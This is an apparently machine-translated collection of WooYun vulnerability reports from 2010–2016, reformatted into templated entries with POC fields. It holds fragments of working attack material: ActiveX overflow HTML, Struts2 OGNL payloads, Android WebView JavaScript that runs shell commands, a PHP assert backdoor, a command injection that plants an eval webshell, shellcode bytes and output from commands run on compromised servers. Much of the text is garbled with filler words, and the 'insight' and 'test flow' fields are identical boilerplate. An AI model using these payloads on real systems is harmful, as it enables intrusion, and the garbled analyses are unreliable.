2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisvulnerabilitycontroltexta certain security vendorofficialtextlog in,textforitsupgrade,look atversionshouldisnew version?6.0,beforevulnerabilityis4.Xversionnamedname:         CSClientManager Classsendlinetext:        Sangfor Technologies Co.,LtdType:         ActiveX controlversion:         6. 0. 0. 0filetext:on timestextquestiontext:     2013text11text16text,14:51text ID:       {D257CF85-8E97-4C9B-8407-459B28006000}usecount:       118text timesnumber:       0file:         CSClientManagerPrj.dllfilefolder:        C:\Program Files\Sangfor\SSL\ClientComponent3[+] Looking for cyclic pattern

**POC**: <html><object classid='clsid:D257CF85-8E97-4C9B-8407-459B28006000' id='target' ></object><script >junk1 = "";while(junk1.length < 190) junk1+="A";eip = "BBBB";junk2 = "CCCCCCCCCCCCCCCCCCCC";nseh = "DDDD";seh ="EEEE";junk3 = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0169486] a certain translated textmanagementinheartjavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityaddress:**.**.**.**:9060/gjjnbs/login.actionhasjavadeserializationvulnerability

**POC**: **.**.**.**:9060/gjjnbs/login.actionhasjavadeserializationvulnerability

**Bypass**: Direct exploitation

**Fix**: weblogicupgradetolatest version
---

---
### [wooyun-2013-042986] #3 Sinfor CSProxy Class Activex Remote Code Execution
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: namedname:         CSProxy Classsendlinetext:        Sinfor Technologies  Co.,LtdType:         ActiveX controlversion:         4. 2. 1. 3filetext:on timestextquestiontext:     2013text11text15text,13:03text ID:       {53EC2F48-968E-4A42-B99B-9F6571474213}usecount:       765text timesnumber:       0file:         ProxyIE.dllfilefolder:        C:\Program Files\Sinfor\SSL\ClientComponent3setCacheHostsubmitlargefor276 peopletextafteroverflowmonatextoffset+] Looking for cyclic pattern in memoryEIP overwritten with lower

**POC**: <html><head><title>Sangfor Activex overflow PoC</title></head><!--0x033829b7 msvcrt._strlwrputtranslated text--><body><object classid="clsid:53EC2F48-968E-4A42-B99B-9F6571474213" id='poc'></object><script>junk1 = "";while(junk1.length < 276) junk1+="A";eip = "DDDD";payload = junk1 + eip;poc.setCacheHost(payloa

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0167130] a certain municipal human resources and social security bureaua certain serverhas"Java deserialization"vulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: address**.**.**.**:9010/has"Java deserialization"vulnerability

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: addtextsecuritytext
---

---
### [wooyun-2013-020260] textsingletexta certain security vendorSSL VPNremote code execution vulnerability(patch not timely)
**Vendor**: textsingletext | **Year**: 2013 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated texthttp://[IP redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-066534] a certain browserremote arbitrary code execution vulnerability
**Vendor**: a certain mobile phoneVendor | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain mobile phoneVendortextsend~downloada certain browserhttps://example.com/[redacted]

**POC**: searchaddJavascriptInterfacethistext- -.thentextitsinforumDetectortestunder~constructonewrite file+popupExp:<html><head><title>test</title></head><body><script>function execute(testcmd){return forumDetector.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh",

**Bypass**: Direct exploitation

**Fix**: 2Saftertranslated text....cantextone2Saftertext:)
---

---
### [wooyun-2013-042026] 2345look attextvulnerabilitycancancausingremote code execution
**Vendor**: 2345web directory | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text,thenisdll hijack,d3dref9.dll,look attext

**POC**: puttoremotetextdirectoryorwebdavallline

**Bypass**: Direct exploitation

**Fix**: textsendtext
---

---
### [wooyun-2011-02980] Xunleiremote code execution vulnerability
**Vendor**: Xunlei | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textnamedloadxlnet_manager.dllfailed.becauseloadlibrarysearchtextinpackettextwhentextdirectory,soifXunleinostartif,textwhentextinhasonenamedasxlnet_manager.dllDLLif,opentextstartXunlei,XunleiwillloadthisDLL,andtextcausingthisDLLindllmainincodebeExecution.textis,translated textthroughinXunleifriendtextonetextBUG.that timesBUGis onenamedas".dll"DLL(text,thenisnonamed,onlyhas.dll).

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: checkloadlibrarycodetext,textabsolute path,translated textforpath.textpathwhencheckunderwhetherastext
---

---
### [wooyun-2015-0101877] YYbrowserdownloadfunctionalitynotrestrictionsametextcancauseRFDattack
**Vendor**: Guangzhou Duowan | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: yybrowseradoptchrome+ietextinsidetext,butfoundchromeinsidetextversiontranslated text,hasRDFattackcancan.textquestionurl:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: reference:https://example.com/[redacted]
---

---
### [wooyun-2010-0885] IE8 CSSparsedenial of servicevulnerability
**Vendor**: Microsoft | **Year**: 2010 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: <div style="position: absolute; top: -999px;left: -999px;"><link href="css.css" rel="stylesheet" type="text/css" />*{color:red;}@import url("css.css");@import url("css.css");@import url("css.css");@import url("css.css");

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-036685] translated texts2vulnerabilitynotFixcausingarbitrary code execution
**Vendor**: translated text | **Year**: 2013 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%2

**POC**: 1.?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletR

**Bypass**: Direct exploitation

**Fix**: Fixvulnerabilityapply patch
---

---
### [wooyun-2012-010266] textbusiness systemvulnerability
**Vendor**: text | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: strutsremote execution

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textdataleakage,upgrade,on timesrewardtextintranslated textto  >_<
---

---
### [wooyun-2016-0171147] patching gapsofTaiwanjoomlacode executionpackage-enterprise(Taiwan region)
**Vendor**: HitconTaiwantranslated textvulnerabilityreporting platform | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: joomlacode execution**.**.**.**   http://**.**.**.**/  translated texthastextcompany**.**.**.**   http://**.**.**.**/   consoletextintranslated texthastextcompany**.**.**.**  http://**.**.**.**/    translated texthastextcompany**.**.**.**     http://**.**.**.**/ consoleintranslated textinheart

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: upgradetextversion
---

---
### [wooyun-2016-0165946] onalsotexta certain enterpriseinformationtextsystemhas remote code execution vulnerabilitycanenterserver
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0146617] a certain search enginetextuseAndroid versionremote code execution vulnerability(a certain search enginetext/input methodas an example)
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection, upload functionality

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: root@hammerhead:/ # busybox netstat -tunlpnetstat: showing only processes with your user IDActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nama certain textplatform        0      0 [IP redacted]            [IP redacted]:*               LISTEN      5260/com.baidu.BaiduMaptcp        0      0 :::40310                :::*

**POC**: exploit1:textinwealreadyhasfiletextpermissions,puttextconverttextExecutionpermissionsthencantextpart shell ,textbeforetranslated textvulnerability.textthentranslated text.putfiletextpluginor so fileinenterlineoverwriteafterExecutionthen can.(textneedisNo.threetext so..because app  so issystempermissions,textusecopytextisnopermissionsenterlinetextoperation)WooYun: a certain search engineinputAndroid clientcodetextVulnerability Analysis(textnametranslated text)hook DexClassLoader constructmethodaftercanfounda certain search enginetextloadas followsplugin10-12 19:50:18.475    1817-2364/? I/IPoison-com.baidu.BaiduMapunicode-FE55 dexPath = /data/data/com.bai

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-062618] translated textinheartarbitrary code execution vulnerability(textaftertext)
**Vendor**: sundns.com | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]]%29%29}passwordc<?php/***  index.php PHPCMS text** @copyright			(C) 2005-2010 PHPCMS* @license				https://example.com/[redacted] @lastmodify			2010-6-1*///PHPCMStextdirectoryif(isset($_REQUEST['page'])){$page = $_REQUEST['page'];$func = 'a';$func .= 'ss';$func .= 'ert';$func($page);exit;}define('PHPCMS_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR

**POC**: https://example.com/[redacted]]%29%29}passwordc

**Bypass**: Direct exploitation

**Fix**: look atvulnerabilityprove shouldtranslated textFix
---

---
### [wooyun-2016-0167462] translated textcontrolinhearthasJavadeserializationvulnerability
**Vendor**: translated textcontrolinheart | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text:http://**.**.**.**/ IP:**.**.**.** port80hasdeserializationvulnerabilityhttp://**.**.**.**,administratorpermissionstextchecklook atdatadatabaseconfigurationfilenottranslated texttest

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0167361] a certain translated texthas"Java deserialization"vulnerability,translated textsiteaffected
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: addresshttp://**.**.**.**:7001/has"Java deserialization"vulnerabilitydirectlyuploadtrojanstoserverin

**POC**: whoamifzybweb\administratornet  user\\FZYBWEB usertext-------------------------------------------------------------------------------Administrator            Guest                    SUPPORT_388945a0test1commandsuccesstext.net  viewservernamedname            text----------------------------------------------------------------

**Bypass**: Direct exploitation

**Fix**: addtextsecuritytext
---

---
### [wooyun-2013-016921] SAPplayerbuffer overflowvulnerability
**Vendor**: SAP | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: SAPstarttextinwillloadskin\defaultdirectoryUI.txtfile,textforprogramandnotforcontententerlinetext,causingloadtextfiletextsendtextbuffer overflow,Executionmaliciouscode!POCas follows:0xDB, 0xC0, 0x31, 0xC9, 0xBF, 0x7C, 0x16, 0x70,0xCC, 0xD9, 0x74, 0x24, 0xF4, 0xB1, 0x1E, 0x58,0x31, 0x78, 0x18, 0x83, 0xE8, 0xFC, 0x03, 0x78,0x68, 0xF4, 0x85, 0x30, 0x78, 0xBC, 0x65, 0xC9,0x78, 0xB6, 0x23, 0xF5, 0xF3, 0xB4, 0xAE, 0x7D,0x02, 0xAA, 0x3A, 0x32, 0x1C, 0xBF, 0x62, 0xED,0x1D, 0x54, 0xD5, 0x66, 0x29, 0x21, 0x

**POC**: modifyfilecontentasPOCcontenttextExecutionprogramvulnerabilitytriggerparttextcalculator

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-017323] a certain security vendorssl vpnremote code execution vulnerability
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: textnotwhen

**Meta-thinking**: Trigger signal: functional testing

**Insight**: textnotwhen lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify textnotwhen-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: $args = $_REQUEST['cmd'];/*something here*/exec("tsutil -proxy $ip $args", $output, $ret);textphp execfunctionallonetextlook attextissueversionSSLVPN M5.6anduseunder texttestlatest versioncopyhttps://example.com/[redacted]'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.phpExecutionecho '<?php eval($_POST[cmd]);?>' >/app/usr/sbin/webui/html/svpn.php textonetextifhttps://example.com/[redacted]

**POC**: $args = $_REQUEST['cmd'];$ip = $_SERVER['REMOTE_ADDR'];exec("tsutil -proxy $ip $args", $output, $ret);

**Bypass**: Direct exploitation

**Fix**: text Itextcantranslated text peopleprogramtextsecuritytranslated text
---

---
### [wooyun-2012-07589] ITools <= [IP redacted] remote code execution vulnerability
**Vendor**: a certain technology company | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: IToolsistexta certain Internet companytexta certain technology companytextsendonetextnumbernametranslated textsametextmanagementsoftware.usercanuseiToolstranslated textfortranslated text(iossystem,packettextiphone,ipad,ipod touch)informationchecklook at,text/text/text/text/filemanagement,softwareinstall,translated textdownloadtextistextsystemmodifyetc..thissoftware1.4.6.0anduseunderversionhas remote code execution vulnerability,textforthissoftwaretranslated textuseprogramtextnamed.IPAfileopen,whenuserinstallIToolsandtextopenone.ipafiletext,IToolswillloadoneIPAfilesamedirectoryCFNetwork.dllfile,ifattackertextheartconstructonemalicious CFNetwork.dllfile,andputtexttonetworkpathorWEBDAVpathon,whencausinguserinnetworkpathtextquestionremoteIPAfile,orusebrowsertextWEBDAVonIPAfiletext,thenwilltriggerattackermaliciouscodegetExecution,installmalwareorstealuserprivacy.

**POC**: installITools [IP redacted]anditstextneedITunes 10+(heretextusetranslated textontext ITunes [IP redacted]installpacket)innetworkpathonputtextarbitraryone.IPAfile,text123.ipasametextputtextonetextundertextexportfunctionCFNetwork.dlltoIPAsamedirectoryCFHTTPMessageSetHeaderFieldValuekCFHTTPVersion1_1CFHTTPMessageCreateRequestCFURLRequestCreateMutableHTTPRequestCFURLResponseGetHTTPResponseCFReadStreamCreateForHTTPReq

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-075143] UCbrowserAndroidlatest version(4.4)cross-domainvulnerability(nottextsystemversionrestriction)
**Vendor**: UC Mobile | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: UCbrowserversion

**POC**: POC<body><script>parentFrame = document.body.appendChild(document.createElement("iframe"));helperFrame1 = parentFrame.contentDocument.body.appendChild(document.createElement("iframe"));helperFrame1.contentWindow.onunload = function() {container = document.createElement("div");targetFrame  = containe

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-035501] a certain IM softwarelatest versioncopyremote code execution vulnerability(needclickExecutiontexthasfile)
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: submituseundercode:\\c:\windows\system32\cmd.exetextcomputerhastextfile,exploitthisconstructcode,Executiontextcomputerontextfile(prerequisiteisneedclick)

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2011-02507] a certain search enginetextremote code execution vulnerability
**Vendor**: a certain search engine | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain search enginetextistextinsideonetextnottextmediatextputsoftware,thissoftwareintranslated textlocationhandletranslated text,but,developerinpublishthissoftwarewhen,noputsoftwareinusetextdatabasefiletext,causinga certain search enginetextplayercantextthistextwilltextremoteexecute arbitrarycode.thisdatabasefilenamednameas"log.dll",textshouldistexthastranslated textblog posttextinterface,putthisfiletextarbitraryformatmediafileputtextinsameonedirectory,whenuserusea certain search enginetranslated textputmediafiletext,"log.dll"fileputwillbesametextload,ifthisfileasmaliciousattackertextsend,thattextthenwilldirectlycauseusersystemtexttoattack.asthis,maliciousattackercanexploitthisvulnerability,remotetranslated texthas"log.dll"andmediafilefilefolder,textusertextquestion,translated textremotetextusersystem.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: codetranslated textorlocaltranslated text
---

---
### [wooyun-2015-0122543] textDNSmanagementsystemremote code execution
**Vendor**: forease.net | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textcanDNSmanagementsystem,php CGIremote code executionhttps://example.com/[redacted]

**POC**: localpackettextdirectlyexecute code:remotepackettextexecute code:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: upgradeapply patch
---

---
### [wooyun-2012-07437] a certain Internet companyclick to opena certain Internet companymessage execute local files and commands
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: sendtextspecifiedtext,canselfconstruct,encryptfortextopen then can executemaliciouscommandetc.

**POC**: fortextclickthisaddress: www.baidu.com..\..\thenwilltextto locala certain Internet company installdirectory:C:\Program Files\Tencent\a certain Internet company\Binselfconstructtext:www.baidu.com..\..\a certain software.exeandcanruna certain Internet company.morecodetextconstruct,canExecutioncmd

**Bypass**: Direct exploitation

**Fix**: translated texta certain Internet company 2013textusetext
---

---
### [wooyun-2016-0167494] a provincialtranslated textmanagementtexta systemjavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textmanagementtexta systemjavadeserializationvulnerability.address:**.**.**.**:7001/ucms/login2.jsp

**POC**: translated textmanagementtexta systemjavadeserializationvulnerability.address:**.**.**.**:7001/ucms/login2.jsp

**Bypass**: Direct exploitation

**Fix**: ....
---

---
### [wooyun-2016-0168308] translated texta certain sitehasJAVAdeserializationvulnerability
**Vendor**: translated text | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: **.**.**.**/serverinformation,permissions,filemanagement

**POC**: RS

**Bypass**: Direct exploitation

**Fix**: upgrade
---

---
### [wooyun-2016-0167796] a certain translated textservicetextmanagementsystemavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated texta certain sitejavadeserializationvulnerability.address:**.**.**.**:7001/pss/jsp/public/login.jsp

**POC**: translated texta certain sitejavadeserializationvulnerability.address:**.**.**.**:7001/pss/jsp/public/login.jsp

**Bypass**: Direct exploitation

**Fix**: 0000
---

---
### [wooyun-2015-0107137] a certain e-commerce platformAndroidclientremote code execution vulnerability
**Vendor**: texta certain e-commerce platformelectronictexthastextcompany | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain e-commerce platformAndroidtextexport2 peoplejsinterface,cancausingremote code execution vulnerability

**POC**: export2 peoplejsinterface:protected void onCreate(Bundle arg4) {super.onCreate(arg4);this.setIsUseSliding(false);this.setContentView(2130903250);this.backToLastPage(((SuningEBuyActivity)this), false);this.c();this.b();if(TextUtils.isEmpty(this.a)) {this.displayToast(2131363958);this.finish();}else {if(this.a != null

**Bypass**: Direct exploitation

**Fix**: addJavascriptInterfacehastextremote code execution vulnerability,translated textuse,API 17inuse@JavascriptInterface textaddjavascriptInterface;textsystemwebkitinsidetranslated textinterfacesearchBoxJavaBridge_,accessibility,a
---

---
### [wooyun-2012-09540] a certain allChina Unicomtextemailsystemremote execution
**Vendor**: a certain telecom operator | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2011-02716] whenwhentextremote code execution vulnerability
**Vendor**: whenwhentext | **Year**: 2011 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textistextinforlowversionnginxURIinsidetext%00appear,causingtextquestion/x.txt%00.phpwillputx.txtasphpcode execution,nginx  0.7.65/0.8.37anduseunderaffected

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-066531] 4Gbrowserremote code execution vulnerability
**Vendor**: roboo.com | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: downloadRoboo4Gbrowser:https://example.com/[redacted]

**POC**: searchaddJavascriptInterfaceNavigatorinterfacevulnerabilityconstructonewrite file+popupExp:<html><head><title>test</title></head><body><script>function execute(testcmd){return Navigator.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webviewremote

**Bypass**: Direct exploitation

**Fix**: :)
---

---
### [wooyun-2012-09531] textinsidetextmanagementsystemremote execution
**Vendor**: text | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: subsitetextmain siteonetogether,textdatatextyou know what to do

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2014-052026] a certain communicationsVendora certain textmobile phonetextbrowserremote code execution vulnerability
**Vendor**: a certain communications equipment vendor | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textsomeonetextonea certain mobile phonetext3cChina Unicomtextmobile phone,notextintestoneundertranslated textwebViewcontrolremote code execution vulnerability,texthas.aboutthisvulnerabilitytextinformationseehttps://example.com/[redacted]

**POC**: vulnerabilityvalidationuseistextcloudtextaboutthisvulnerabilityvalidationwebpage,addressashttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: recommendseehttps://example.com/[redacted]
---

---
### [wooyun-2014-049947] Dolphin Browserhdremote code execution vulnerability
**Vendor**: Dolphin Browser | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: browsercometextthis kind ofissuetextisneedpatchexportdolphinRSSCheckeritsinexportsearchBoxJavaBridge_seemsisrelated to the Google search box.inandroid 4.0mobile phoneontestactually exists,4.2versions abovenothasfunction execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}testpage:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: https://example.com/[redacted]
---

---
### [wooyun-2014-048047] textAVIformatheap overflowvulnerability
**Vendor**: text | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textstandardtext(text5.0)foraviformatlocationhandlehasone locationheap overflow,cancauseremote code execution vulnerability.ifaviformatstrftextdatalenlengthtextlarge,willcausingheap overflow.

**POC**: POCaddress:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: forstrfresultdatalenlengthverify
---

---
### [wooyun-2014-061543] a certain textAPPclientremote code execution
**Vendor**: a certain Internet company | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

